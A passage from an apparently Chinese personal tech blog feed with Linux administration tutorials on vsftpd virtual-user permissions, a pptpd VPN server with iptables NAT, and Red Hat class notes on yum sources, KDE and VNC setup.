bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> /etc/vsftpd/vu<br><span class="hljs-built_in">sudo</span> vim /etc/vsftpd/vu/tea1<br></code></pre></td></tr></table></figure><p>在打开的窗口中输入<code>tea1</code>用户的权限设置并保存：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">guest_username=ftp<br>local_root=/home/ftp/ftp/tea1/<br>virtual_use_local_privs=YES<br>anon_umask=133<br>cmds_allowed=ABOR,ACCT,APPE,CWD,CDUP,DELE,HELP,LIST,MODE,MDTM,MKD,NOOP,NLST,PASS,PASV,PORT,PWD,QUIT,REIN,RETR,RMD,RNFR,RNTO,SITE,SIZE,STOR,STAT,STOU,STRU,SYST,TYPE,USER<br></code></pre></td></tr></table></figure><p>然后建立<code>tea2</code>的配置文件并输入配置信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/vsftpd/vu/tea2<br></code></pre></td></tr></table></figure><p>配置信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">guest_username=ftp<br>local_root=/home/ftp/ftp/tea2/<br>virtual_use_local_privs=YES<br>anon_umask=133<br>cmds_allowed=ABOR,ACCT,APPE,CWD,CDUP,DELE,HELP,LIST,MODE,MDTM,MKD,NOOP,NLST,PASS,PASV,PORT,PWD,QUIT,REIN,RETR,RMD,RNFR,RNTO,SITE,SIZE,STOR,STAT,STOU,STRU,SYST,TYPE,USER<br></code></pre></td></tr></table></figure><p>建立<code>stu</code>的配置文件并输入配置信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/vsftpd/vu/stu<br></code></pre></td></tr></table></figure><p>配置信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">guest_username=ftp<br>local_root=/home/ftp/ftp/<br>virtual_use_local_privs=YES<br>anon_umask=133<br>cmds_allowed=FEAT,REST,CWD,LIST,MDTM,MKD,NLST,PASS,PASV,PORT,PWD,QUIT,RMD,SIZE,STOR,TYPE,USER,ACCT,APPE,CDUP,HELP,MODE,NOOP,REIN,STAT,STOU,STRU,SYST<br></code></pre></td></tr></table></figure><p>建立<code>admin</code>的配置文件并输入配置信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/vsftpd/vu/admin<br></code></pre></td></tr></table></figure><p>配置信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">guest_username=ftp<br>local_root=/home/ftp/ftp/<br>virtual_use_local_privs=YES<br>anon_umask=133<br>cmds_allowed=ABOR,ACCT,APPE,CWD,CDUP,DELE,HELP,LIST,MODE,MDTM,MKD,NOOP,NLST,PASS,PASV,PORT,PWD,QUIT,REIN,RETR,RMD,RNFR,RNTO,SITE,SIZE,STOR,STAT,STOU,STRU,SYST,TYPE,USER<br></code></pre></td></tr></table></figure><blockquote><p>关于<code>cmds_allowed</code>的一些知识</p></blockquote><p>以逗号分隔的方式指定可用的FTP命令(post　login. USER, PASS and QUIT 是始终可用的命令)。在vsftpd中可以使用默认的一些方法配置来调节用户的对文件操作的权限，但是，对于有些权限的配置的效果却不尽人意，为此<code>cmds_allowed</code>就可以发挥它巨大的作用。这是一个强有力的locking down一个FTP服务器的手段。下面是它的实例和一些配置解释：</p><ol><li>只能上传。不能下载、删除、重命名。  <code>cmds_allowed=FEAT,REST,CWD,LIST,MDTM,MKD,NLST,PASS,PASV,PORT,PWD,QUIT,RMD,SIZE,STOR,TYPE,USER,ACCT,APPE,CDUP,HELP,MODE,NOOP,REIN,STAT,STOU,STRU,SYST</code></li><li>只能下载、删除、重命名。不能上传。<br>  <code>cmds_allowed=FEAT,REST,CWD,LIST,MDTM,MKD,NLST,PASS,PASV,PORT,PWD,QUIT,RMD,RNFR,RNTO,RETR,DELE,SIZE,TYPE,USER,ACCT,APPE,CDUP,HELP,MODE,NOOP,REIN,STAT,STOU,STRU,SYST</code></li><li>配置解释：<br>  <code>cmds_allowed=ABOR,ACCT,APPE,CWD,CDUP,DELE,HELP,LIST,MODE,MDTM,MKD,NOOP,NLST,PASS,PASV,PORT,PWD,QUIT,REIN,RETR,RMD,RNFR,RNTO,SITE,SIZE,STOR,STAT,STOU,STRU,SYST,TYPE,USER</code><br>  其中：</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">CWD - change working directory 更改目录<br>DELE - delete a remote file 删除文件<br>LIST - list remote files 列目录<br>MKD - make a remote directory 新建文件夹<br>NLST - name list of remote directory<br>PWD - <span class="hljs-built_in">print</span> working directory 显示当前工作目录<br>RETR - retrieve a remote file 下载文件<br>RMD - remove a remote directory 删除目录<br>RNFR - rename from 重命名<br>RNTO - rename to 重命名<br>STOR - store a file on the remote host 上传文件<br>ABOR - abort a file transfer 取消文件传输<br>CWD - change working directory 更改目录<br>DELE - delete a remote file 删除文件<br>LIST - list remote files 列目录<br>MDTM - <span class="hljs-built_in">return</span> the modification <span class="hljs-keyword">time</span> of a file 返回文件的更新时间<br>MKD - make a remote directory 新建文件夹<br>NLST - name list of remote directory<br>PASS - send password<br>PASV - enter passive mode<br>PORT - open a data port 打开一个传输端口<br>PWD - <span class="hljs-built_in">print</span> working directory 显示当前工作目录<br>QUIT - terminate the connection 退出<br>RETR - retrieve a remote file 下载文件<br>RMD - remove a remote directory<br>RNFR - rename from<br>RNTO - rename to<br>SITE - site-specific commands<br>SIZE - <span class="hljs-built_in">return</span> the size of a file 返回文件大小<br>STOR - store a file on the remote host 上传文件<br>TYPE - <span class="hljs-built_in">set</span> transfer <span class="hljs-built_in">type</span><br>USER - send username<br>ACCT* - send account information<br>APPE - append to a remote file<br>CDUP - CWD to the parent of the current directory<br>HELP - <span class="hljs-built_in">return</span> <span class="hljs-built_in">help</span> on using the server<br>MODE - <span class="hljs-built_in">set</span> transfer mode<br>NOOP - <span class="hljs-keyword">do</span> nothing<br>REIN* - reinitialize the connection<br>STAT - <span class="hljs-built_in">return</span> server status<br>STOU - store a file uniquely<br>STRU - <span class="hljs-built_in">set</span> file transfer structure<br>SYST - <span class="hljs-built_in">return</span> system <span class="hljs-built_in">type</span><br></code></pre></td></tr></table></figure><h2 id="五、两个问题说明："><a href="#五、两个问题说明：" class="headerlink" title="五、两个问题说明："></a>五、两个问题说明：</h2><blockquote><p>###问题一：vsftpd搭建的FTP服务器存在的中文编码问题</p></blockquote><p>事先说明清楚的是，我的服务器环境是Ubuntu14.04，而FTP的访问者们大多都是使用Windows的系统，并且他们没有多少人使用一些比较专业的FTP客户端软件进行访问，他们大多数都是使用的Windows自带的资源管理器进行访问。</p><p>Linux中使用UTF-8作为locale已经成为理所当然的事，然而windows资源管理器却只支持GBK这一系列的编码，恰巧vsftpd并不会处理文件名的编码，这就会出现很不友好的问题，因此针对vsftpd的这个缺陷，网上之前也有过针对它的补丁，使得vsftpd可以进行编码转换，然而这个补丁的版本较老，针对新版本的vsftpd可能还会出现一系列的错误，这里就不对补丁进行介绍了。</p><p>之后通过一番查询，发现可以使用基于文件系统的fuse-convmvfs创建一个目录的镜像，一不用打补丁，二是所有的ftp服务器都可以使用，它的原理是：fuse-convmvfs 可以创建一个目录的镜像，在这个镜像里面的文件名都是经过 iconv 进行编码转换的结果，在底层则完全是同一个目录。例如下面代码所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">convmvfs /home/ftp/ftpgbk -o srcdir=/home/ftp/ftp,icharset=utf8,ocharset=gbk,allow_other,uid=0,gid=11<br></code></pre></td></tr></table></figure><p>上面代码的含义是将 <code>/home/ftp/ftpgbk</code> 作为 <code>/home/ftp/ftp</code> 的一个镜像，只是在 <code>/home/ftp/ftpgbk</code> 里面这些文件的名字“看起来是 GBK 编码的”。执行完上面语句之后，为使客户端使用时，查看的文件不会出现乱码，我们还需要将系统ftp的目录改为我们映射的<code>/home/ftp/ftpgbk</code>，然后还需要把ftp中的各个虚拟用户中的指定的路径中的<code>/home/ftp/ftp</code>改为<code>/home/ftp/ftpgbk</code>，这样就ok了。</p><blockquote><p>###问题二：基于问题一成功后的仍旧的编码问题。</p></blockquote><p>说起来很有意思，大家如果全部读完了上文，应该会知道如果我们没有在tea1，tea2以及admin的目录权限配置文件中书写<code>cmds_allowed</code>,它们还是会对该目录及目录下的所有文件拥有全部权限，但是，如果，你没在它们的配置文件中加上<code>cmds_allowed</code>配置项的话，即使你完成了问题一的解决方式，仍然会出现编码问题，因为我之前写的博客中没有在它们三个的配置文件中加上<code>cmds_allowed</code>配置项，之后调试的时候烦恼了我很长时间，特此记录。</p>]]></content>
      
      
      
        <tags>
            
            <tag> vsftpd </tag>
            
            <tag> FTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pptpd搭建VPN服务器</title>
      <link href="/2016/01/01/pptpd-vpn/"/>
      <url>/2016/01/01/pptpd-vpn/</url>
      
        <content type="html"><![CDATA[<h2 id="一、正题"><a href="#一、正题" class="headerlink" title="一、正题"></a>一、正题</h2><ol><li><p>安装pptpd<br>  安装之前，先更新一下源，<code>sudo apt-get update</code><br>  然后安装：<code>sudo apt-get install pptpd</code></p></li><li><p>配置内网ip策略<br>  <code>sudo vim /etc/pptpd.conf</code><br>  在文件中加入下面2行代码（其实文件末尾有这段代码，不过前面有注释，你也可以直接去掉注释）：<br>  <code>localip 192.168.0.1   remoteip 192.168.0.234-238,192.168.0.245</code></p><blockquote><p>注意：<br>localip 自己服务器的IP（pptpd中设置的，并不是你的服务器真正的ip，此处可以理解为使用路由器时，路由器的管理ip，remoteip 分配给客户端的IP ，所有使用该vpn服务器都会获得该ip段内的一个IP）</p></blockquote></li><li><p>配置dns<br>  <code>sudo vim /etc/ppp/pptpd-options</code><br>  在该文中加入下面2行，也可以配置其他dns:<br>  <code>ms-dns 8.8.8.8   ms-dns 8.8.4.4</code></p></li><li><p>配置VPN帐号<br>  <code>sudo vim /etc/ppp/chap-secrets</code><br>  添加vpn账号、服务器名、vpn密码和IP限制，一个帐号一行，每个参数中间用空格间隔。如：  <code>test * testpass *</code></p></li><li><p>TCP&#x2F;IP策略配置:<br>  <code>sudo vim /etc/sysctl.conf</code><br>  插入下面这一行代码（下面该段代码这个文件中也有，也可以取消注释，我这里是取消注释）,保存并退出：<br>  <code>net.ipv4.ip_forward=1</code><br>  然后使用下面这段代码，可以看到出现的代码中出现刚才添加的或者取消注释的那段代码：<br>  <code>sudo sysctl -p</code>  </p><blockquote><p>注意：一定要注意“-”号的使用，一定要注意，下面也有很多，遇到在提。如果提示<code>net.ipv4.ip_forward = 1</code>，说明配置生效，如下图所示：</p></blockquote></li><li><p>开放网络端口<br>  安装iptables(已安装请忽略，不知道安没安装，那就再安一遍，如果按了会提示)<br>  <code>sudo apt-get install iptables</code><br>  然后开放1723端口：<br>  <code>sudo iptables -I INPUT -p tcp --dport 1723 -j ACCEPT</code></p></li><li><p>配置NAT网络地址转换:<br>  下面的更有意思，记住哈，所有的“-”号都有两个，但是interface前面的“-号”只有一个，还有就是下面代码中的eth0是你的网卡名称，如果不知道你的网卡名称是什么，请使用ifconfig命令查看一下你的网卡名称，一定要注意，如果你的ubuntu有多个网卡的话，一定要查看对应网卡的对应ip，我这里因为有两个网卡，一个拥有内网的ip，一个拥有外网的ip，当然了，我肯定要使用外网的，因此，我使用的是eth1，截图如下（一定要注意结合实际！！）<br>  <code>sudo iptables --table nat --append POSTROUTING --out-interface eth1 --jump MASQUERADE</code></p></li><li><p>为确保系统重启后VPN可直接使用我们需要进行如下操作：</p><blockquote><p>###1.让之前配置的iptables信息保存并设置为开机启动：</p></blockquote></li></ol><ul><li>创建存储iptables信息的文件：<br> <code>touch /etc/iptables</code></li><li>将上面的关于iptables的两个操作信息保存到该文件中：<br> <code>iptables-save &gt; /etc/iptables</code>  </li><li>创建自启动配置文件，并授予可执行权限：<br> <code>touch /etc/network/if-pre-up.d/iptables</code><br> <code>chmod +x /etc/network/if-pre-up.d/iptables</code></li><li>编辑自启动配置文件，内容为启动网络时恢复的iptables配置信息：<br> <code>vi /etc/network/if-pre-up.d/iptables</code><br> 文件中内容为：<br> <code>#!/bin/sh</code><br> <code>/sbin/iptables-restore &lt; /etc/iptables</code>  </li><li>保存该信息后即可，下面是iptables的两个命令解析：<ul><li>保存iptables信息命令： iptables-save&gt;&#x2F;etc&#x2F;iptables  </li><li>恢复iptables信息命令： iptables-restore &lt;&#x2F;etc&#x2F;iptables</li></ul></li></ul><blockquote><p>###2.开机后自动开启pptpd服务：</p></blockquote><ul><li>在&#x2F;etc&#x2F;rc.local文件的exit 0之前添加软件启动命令:<br> <code>/etc/init.d/pptpd start</code></li></ul><ol start="9"><li>最后重启pptpd<br>  <code>sudo /etc/init.d/pptpd restart</code><br>  接下来就可以使用测试的用户名与密码连接你的vpn服务器了。即使系统重启后，我们任然可以直接使用VPN.</li></ol><blockquote><p>###一个问题：连接后部分网站无法访问解决方法</p></blockquote><p>在我们的使用过程中发现百度的相关网站无法访问，当时也并未找到一些方法去解决，昨日，烫烫烫发来消息说原来是虚拟网卡的MTU值影响了部分网站的访问，在他修改后确实成功访问百度，所以贴出解决方案，避免更多人苦恼（我们是将虚拟网卡<code>ppp0</code>的<code>MTU</code>改为<code>1400</code>）。</p><ul><li>临时修改方法：<br> <code>ifconfig ppp0 mtu 1400</code>  </li><li>(推荐)永久修改方法:<br> 避免以后重启机器需重新配置，打开<code>/etc/ppp/ip-up</code>文件，并在<code>exit 0</code>前面（如果没有<code>exit 0</code>的话，就定位到文件末尾）加上如下代码：<br> <code>/sbin/ifconfig $1 mtu 1400</code></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pptpd </tag>
            
            <tag> VPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Red Hat课堂学习知识点笔记</title>
      <link href="/2016/01/01/redhat-note/"/>
      <url>/2016/01/01/redhat-note/</url>
      
        <content type="html"><![CDATA[<h2 id="一、环境及目录"><a href="#一、环境及目录" class="headerlink" title="一、环境及目录"></a>一、环境及目录</h2><p>课堂讲述及联想所记，便于自己后来查阅同时与他人便利。</p><ul><li>两款虚拟机：VMware Workstation 12 Pro、VirtualBox 5.1.22</li><li>Rad Hat镜像：RedHat-Server-6.4-i386</li><li>其他一些工具：XShell 5、Putty</li></ul><h2 id="二、目录列表"><a href="#二、目录列表" class="headerlink" title="二、目录列表"></a>二、目录列表</h2><blockquote><h2 id="1-VMware的VMware-Tools安装与VirtualBox的增强工具"><a href="#1-VMware的VMware-Tools安装与VirtualBox的增强工具" class="headerlink" title="1.VMware的VMware Tools安装与VirtualBox的增强工具"></a><a href="#redhat_1">1.VMware的VMware Tools安装与VirtualBox的增强工具</a></h2><h2 id="2-RedHat的root用户的密码初始化"><a href="#2-RedHat的root用户的密码初始化" class="headerlink" title="2.RedHat的root用户的密码初始化"></a><a href="#redhat_2">2.RedHat的root用户的密码初始化</a></h2><h2 id="3-RedHat无法使用yum安装软件解决方法"><a href="#3-RedHat无法使用yum安装软件解决方法" class="headerlink" title="3.RedHat无法使用yum安装软件解决方法"></a><a href="#redhat_3">3.RedHat无法使用yum安装软件解决方法</a></h2><h2 id="4-添加KDE桌面-中文支持和VNC设置体验"><a href="#4-添加KDE桌面-中文支持和VNC设置体验" class="headerlink" title="4.添加KDE桌面&#x2F;中文支持和VNC设置体验"></a><a href="#redhat_4">4.添加KDE桌面&#x2F;中文支持和VNC设置体验</a></h2><h2 id="5-XShell和X11转发"><a href="#5-XShell和X11转发" class="headerlink" title="5. XShell和X11转发"></a><a href="#redhat_5">5. XShell和X11转发</a></h2></blockquote><p><a id="redhat_1"></a></p><h3 id="2-1、VMware的VMware-Tools安装与VirtualBox的增强工具"><a href="#2-1、VMware的VMware-Tools安装与VirtualBox的增强工具" class="headerlink" title="2.1、VMware的VMware Tools安装与VirtualBox的增强工具"></a>2.1、VMware的VMware Tools安装与VirtualBox的增强工具</h3><p>为了加强同时使用虚拟机与主机的用户体验，像是实现虚拟机和主机图形用户界面之间平滑移动鼠标光标等的需求，我们在两款虚拟机软件中安装对应的增强工具。</p><h3 id="2-2、安装VMware的VMware-Tools："><a href="#2-2、安装VMware的VMware-Tools：" class="headerlink" title="2.2、安装VMware的VMware Tools："></a>2.2、安装VMware的VMware Tools：</h3><ul><li>在虚拟机中进入桌面后，点击VMware菜单栏的”虚拟机”，然后点击”安装VMware Tools”，在RedHat中确定VMware Tools的挂载点位置。</li><li>将VMware Tools中的类似于”VMwareTools-xxxxxx.tar.gz”的文件解压到另一个文件夹(例如tmp)中，解压，并运行安装，一路确定加回车即可。示例代码如下：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">tar zxvf VMwareTools-xxxxxx.tar.gz -C /tmp/<br><span class="hljs-built_in">cd</span> vmware-tools-distrib/<br>./vmware-install.pl<br></code></pre></td></tr></table></figure><h3 id="2-3、安装VirtualBox的增强工具："><a href="#2-3、安装VirtualBox的增强工具：" class="headerlink" title="2.3、安装VirtualBox的增强工具："></a>2.3、安装VirtualBox的增强工具：</h3><ul><li>首先确保本机已经安装kernel-devel和gcc两个依赖包，如果没有可以使用下面代码进行安装(如果下面代码使用后出错，请参考<a href="#redhat_3">RedHat无法使用yum在线安装软件解决方法</a>)：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum install kernel-devel<br>yum install gcc<br></code></pre></td></tr></table></figure><ul><li>在虚拟机中进入桌面后，查看该虚拟机的界面右下角，会有一排小图标，其中有个光驱图标，确保它是灰色的，即确保该虚拟机的光驱没有被其他占用，然后点击VirtualBox窗口的”设备”，然后点击”安装增强工具”。</li><li>虚拟机系统界面就会弹出安装提示，点击”OK”，然后点击”RUN”继续即可,最后重启生效。类似图如下：<br><img src="/assets/images/redhat-note-1.jpg" alt="RedHat" loading="lazy"><br><img src="/assets/images/redhat-note-2.jpg" alt="RedHat" loading="lazy"></li></ul><p><a id="redhat_2"></a></p><h3 id="2-4、RedHat的root用户的密码初始化"><a href="#2-4、RedHat的root用户的密码初始化" class="headerlink" title="2.4、RedHat的root用户的密码初始化"></a>2.4、RedHat的root用户的密码初始化</h3><p>由于在VMware中安装的RedHat并没有提示设置root用户密码，并且系统策略也不和Ubuntu一样：Ubuntu中当root用户未设置密码时，普通用户可以使用 <code>sudo passwd root</code> 初始化root账户密码。所以我们需要如下步骤设置root账户密码：</p><ul><li>重启系统后在引导装载程序菜单上，用上下方向键选择你忘记密码的那个系统键入”e”来进入编辑模式，我的系统是两个选项，不过都是一个系统，区别在于是否有GUI显示；</li><li>接着用上下键选择最新的内核,这里是”kernel &#x2F;vmlinuz-2.6.32-696.1.1.e16.i686 ro root&#x3D;UUID&#x3D;96504b88-d13d-4a”，然后继续按“e”键；</li><li>然后输入空格+single，即” single”，或者直接输入数字”1”,最后回车；</li><li>然后返回了那个内核界面，按下”b”进入单用户模式，在这里修改root的密码，之后重启即可。</li></ul><p><a id="redhat_3"></a></p><h3 id="2-5、RedHat无法使用yum安装软件解决方法"><a href="#2-5、RedHat无法使用yum安装软件解决方法" class="headerlink" title="2.5、RedHat无法使用yum安装软件解决方法"></a>2.5、RedHat无法使用yum安装软件解决方法</h3><p>如果我们在虚拟机中使用RedHat去执行 <code>yum install xxx</code> 安装软件的话，系统会给出类似于 “This system is not registered to Red Hat Subscription Management.You can use subscription-manager to register.” 这说明我们是没办法使用yum在线安装RedHat的软件了，这就十分尴尬了。这么好用的yum不能用，尴尬癌都犯了有没有。</p><p>三种办法解决，第一种去用CentOS，第二种我们使用RedHat的光盘ISO镜像作为本地源，第三种我们卸载RedHat自带yum，然后用CentOS的yum进行替换。第二种以及第三种的实现方法具体如下所示：</p><h3 id="2-6、使用RedHat的光盘ISO镜像作为本地源"><a href="#2-6、使用RedHat的光盘ISO镜像作为本地源" class="headerlink" title="2.6、使用RedHat的光盘ISO镜像作为本地源"></a>2.6、使用RedHat的光盘ISO镜像作为本地源</h3><ul><li>首先我们需要挂载本地RedHat的光盘ISO镜像，无论是VMware还是VirtualBox，都是在菜单栏目中将可移动设备光盘中设置为对应的RedHat镜像，并挂在到虚拟机中；</li><li>然后我们修改RedHat镜像的挂载位置(一定要记住之前的挂载点)，目的是便于后面使用，防止空格等字符的存在我们无法进入对应目录等，图示及命令如下所示：<br><img src="/assets/images/redhat-note-3.jpg" loading="lazy"></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">umount /dev/sr0<br><span class="hljs-built_in">mkdir</span> -p /media/cdrom<br>mount /dev/sr0 /media/cdrom<br></code></pre></td></tr></table></figure><ul><li>接着修改系统源设置文件中的信息，将我们新挂载的RedHat镜像源加入改文件中，这个文件位置是 <code>/etc/yum.repos.d/rhel-source.repo</code>，我添加的一个源信息是该文件中最后一个，如下图所示：<br><img src="/assets/images/redhat-note-4.jpg" loading="lazy"></li><li>最后我们清楚yum缓存并获取yum列表尝试一下，代码及成功的图示如下所示：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum clean all<br>yum makecache<br></code></pre></td></tr></table></figure><p><img src="/assets/images/redhat-note-5.jpg" loading="lazy"></p><h3 id="2-7、使用CentOS的yum进行替换RedHat自带的yum"><a href="#2-7、使用CentOS的yum进行替换RedHat自带的yum" class="headerlink" title="2.7、使用CentOS的yum进行替换RedHat自带的yum"></a>2.7、使用CentOS的yum进行替换RedHat自带的yum</h3><ul><li>首先确定系统是32位的还是64位的，可以使用命令 <code>uname -a</code> 查看，根据系统位数，前往<a href="http://mirrors.163.com/centos/6/os/" target="_blank">网易开源镜像站</a>对应目录下的Packages目录中获取文件链接使用 <code>wget</code> 下载相关软件；</li><li>(我RedHat是32位)相关软件如下所示，不过你会发现网站中并没有<br> <code>yum-3.2.29-30.el6.centos.noarch.rpm</code> ，反而有一个 <code>yum-3.2.29-81.el6.centos.noarch.rpm</code>，我想说的是，你下载后者安装会出错，所以你可从<a href="https://github.com/CUBEGWZ/Other/raw/master/yum-3.2.29-30.el6.centos.noarch.rpm">这里</a>下载 <code>yum-3.2.29-30.el6.centos.noarch.rpm</code> 这个文件</li><li>python-iniparse-0.3.1-2.1.el6.noarch.rpm</li><li>yum-3.2.29-30.el6.centos.noarch.rpm</li><li>yum-metadata-parser-1.1.2-16.el6.i686.rpm</li><li>yum-plugin-fastestmirror-1.1.30-40.el6.noarch.rpm</li><li>然后我们卸载RedHat自带的yum，解释及命令如下所示：</li><li>xargs是一条Unix和类Unix操作系统的常用命令。它的作用是将参数列表转换成小块分段传递给其他命令，以避免参数列表过长的问题；</li><li>–nodeps  强制卸载,不管依赖性；</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">rpm -qa | grep yum | xargs rpm -e --nodeps<br></code></pre></td></tr></table></figure><ul><li>然后安装下载的CentOS的yum包，需要注意的的最后一名命令将两个软件一起安装的原因是防止安装时出现依赖性错误，代码如下：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">rpm -ivh python-iniparse-0.3.1-2.1.el6.noarch.rpm<br>rpm -ivh yum-metadata-parser-1.1.2-16.el6.i686.rpm<br>rpm -ivh yum-3.2.29-30.el6.centos.noarch.rpm yum-plugin-fastestmirror-1.1.30-40.el6.noarch.rpm<br></code></pre></td></tr></table></figure><ul><li>然后我们前往<a href="http://mirrors.163.com/.help/centos.html">CentOS镜像使用帮助</a>下载CentOS 6 的repo文件，并将其放置在 <code>/etc/yum.repo.d</code> 目录中,之后编辑下载的 <code>CentOS6-Base-163.repo</code> 文件，将其中的$releasever更改为centos的版本号,此处为 <code>6</code> ,关于 <code>CentOS6-Base-163.repo</code> 文件说明一下：</li><li>CentOS-Base.repo 是yum 网络源的配置文件</li><li>CentOS-Media.repo 是yum 本地源的配置文件****</li><li>最后我们清楚缓存并获取yum列表，之后就可以使用yum命令在线安装软件了，方便至极，代码如下所示：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum clean all<br>yum makecache<br></code></pre></td></tr></table></figure><ul><li>补充：最后比较意思的是，当我们重启服务器的时候，我们会发现，系统启动界面变成了 <code>CentOS</code> 的，然后，让我们利用 <code>cat /etc/issue</code> 查看系统发行版本时还是Red Hat。</li></ul><p><a id="redhat_4"></a></p><h3 id="2-8、添加KDE桌面-中文支持和VNC设置体验"><a href="#2-8、添加KDE桌面-中文支持和VNC设置体验" class="headerlink" title="2.8、添加KDE桌面&#x2F;中文支持和VNC设置体验"></a>2.8、添加KDE桌面&#x2F;中文支持和VNC设置体验</h3><h3 id="2-9、添加KDE桌面-中文支持"><a href="#2-9、添加KDE桌面-中文支持" class="headerlink" title="2.9、添加KDE桌面&#x2F;中文支持"></a>2.9、添加KDE桌面&#x2F;中文支持</h3><ul><li>在我们可以使用 <code>yum</code>的基础之上，我们需要安装 <code>KDE Desktop</code>这个软件组，我们可以使用下面的命令进行查看与安装：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum grouplist<br>yum groupinstall <span class="hljs-string">&quot;KDE Desktop&quot;</span><br></code></pre></td></tr></table></figure><ul><li>之后我们可能需要安装中文支持包，其中包括 <code>kde-i18n-Chinese</code> 和 <code>kde-l10n-Chinese</code>，命令如下所示：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum install kde-i18n-Chinese<br>yum install kde-l10n-Chinese<br></code></pre></td></tr></table></figure><ul><li>然后就需要修改系统默认的语言显示，这里有两种办法，第一种，在GUI界面上修改，第二种通过命令行修改，命令行修改的操作是将 <code>/etc/sysconfig/i18n</code> 中的 <code>LANG=&quot;en_US.UTF-8&quot;</code> 改为 <code>LANG=&quot;zh_CN.UTF-8&quot;</code>,然后 <code>logout</code> 重新登录即可。</li><li>关于 <code>i18n</code> 与 <code>l10n</code> 的补充解释：</li><li><code>i18n</code> 是”Internationalization”的缩写，中间的18代表在首字母”i”和尾字母”n”之间省略了 18 个字母，国际化是指采用国际标准提取或显示信息;</li><li><code>l10n</code> 是”Localization”的缩写，中间的10代表在首字母”l”和尾字母”n”之间省略了10个字母，本地化是在国际化的基础上针对不同地区进行个性化设置，就例如微软的系统安装诗句;</li></ul><h3 id="2-10、VNC设置体验"><a href="#2-10、VNC设置体验" class="headerlink" title="2.10、VNC设置体验"></a>2.10、VNC设置体验</h3><ul><li><p>VNC(Virtual Network Computing)是基于RFB（Remote Frame Buffer）协议进行通信的，是一个基于平台无关的简单显示协议的超级瘦客户系统，VNC的缺省端口是main:5900（C&#x2F;S）和http:5800（B&#x2F;S）端口。<br>RFB (远程帧缓存) 是一个远程图形用户的简单协议，因为它工作在帧缓存级别上，所以它可以应用于所有的窗口系统，例如：X11,Windows和Mac系统。由于RFB是基于TCP的一个应用层协议，所以VNC也是基于TCP协议的。</p></li><li><p>所需软件包括，RedHat服务器端安装的VNC服务器端软件，以及Windows下需要的VNC客户端软件，这里使用 <code>VNC Viewer</code>，下面安装VNC服务器端软件：</p></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum install vnc-server<br></code></pre></td></tr></table></figure><ul><li>然后我们需要修改VNC的配置文件 <code>/etc/sysconfig/vncservers</code> ，根据其中示例设置一个用户认证连接设置，这里我们使用root用户进行远程连接，也可以创建其他用户进行连接，我的配置文件如下所示：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">VNCSERVERS=<span class="hljs-string">&quot;1:root&quot;</span><br>VNCSERVERARGS[1]=<span class="hljs-string">&quot;-geometry 1024x768&quot;</span><br></code></pre></td></tr></table></figure><ul><li>其中关于VNC的配置文件详细解释如下所示：</li><li>数字 <code>1</code> 代表远程连接的实际TCP端口为 <code>5900+1</code> ，这是因为VNC Server 的默认初始端口是 5900，用户设置的端口是和初始端口做加法然后使用的，如果想要修改，可以进入 <code>/usr/bin/vncserver</code> 修改即可；</li><li>这里的 <code>root</code> 是一个系统用户，如果设置了多个用户可以通过自己的专属端口使用VNC，其中VNCSERVERS的内容可以写成”1:root 2:test”，但是必须存在多个VNCSERVERARGS[*] 。</li><li>VNCSERVERARGS的参数 <code>-geometry 1024x768</code> 是设置客户端显示的桌面分辨率大小。</li><li>VNCSERVERARGS的参数 <code>-nohttpd</code> 是不监听HTTP端口。</li><li>VNCSERVERARGS的参数 <code>-nolisten 6000</code> 是不监听TCP 6000端口。</li><li>VNCSERVERARGS的参数 <code>-localhost</code> 指只允许从本机访问</li><li>VNCSERVERARGS的参数 <code>-AlwaysShared</code> 这是默认参数，不写的话也是默认存在的，此参数允许可以多个客户端同时使用一个用户及对应的端口进行连接，但是连接后，所有的VNC界面将显示相同，所有人都会看到相同的界面。</li><li>VNCSERVERARGS的参数 <code>-SecurityTypes  None</code> 是指登录不需要密码认证，如果将 <code>None</code> 换成 <code>VncAuth</code> ,则需要密码认证，默认值是 <code>VncAuth</code> 。</li><li>VNCSERVERARGS的参数 <code>-depth</code> 是色深，参数有8、16、24、32。</li><li>需要注意防火墙的影响，如果服务器端开启了 <code>iptables</code> 防火墙，我们可以关闭防火墙，或者添加防火墙规则，允许我们的端口通过</li><li>关闭防火墙：<code> service iptables stop</code>;</li><li>添加防火墙规则，允许端口通过：<code>iptables -A INPUT -p tcp --dport 5900:5920 -j ACCEPT</code>;</li></ul><p><a id="redhat_5"></a></p><h1 id="5-XShell和X11转发-1"><a href="#5-XShell和X11转发-1" class="headerlink" title="5. XShell和X11转发"></a>5. XShell和X11转发</h1><p>X11是X Window系统的简称，由于X 